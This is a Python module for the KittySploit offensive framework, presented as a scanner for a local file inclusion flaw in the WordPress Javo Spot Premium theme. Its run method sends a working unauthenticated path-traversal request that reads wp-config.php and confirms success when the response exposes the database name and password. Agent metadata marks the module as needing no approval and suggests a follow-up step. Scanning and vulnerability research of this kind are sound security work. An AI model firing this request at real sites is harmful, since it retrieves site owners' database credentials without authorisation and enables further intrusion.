#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated att."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Javo Spot Premium Theme - Local File Inclusion Detection',
        'description': 'WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated attackers access to locally stored file and return their content.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-theme', 'lfi', 'wp', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://codeseekah.com/2017/02/09/javo-themes-spot-lfi-vulnerability/',
            'https://wpscan.com/vulnerability/2d465fc4-d4fa-43bb-9c0d-71dcc3ee4eab',
            'https://themeforest.net/item/javo-spot-multi-purpose-directory-wordpress-theme/13198068',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Javo Spot Premium Theme - Local File Inclusion detected",
                path='/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery',
            )
            return True
        return False

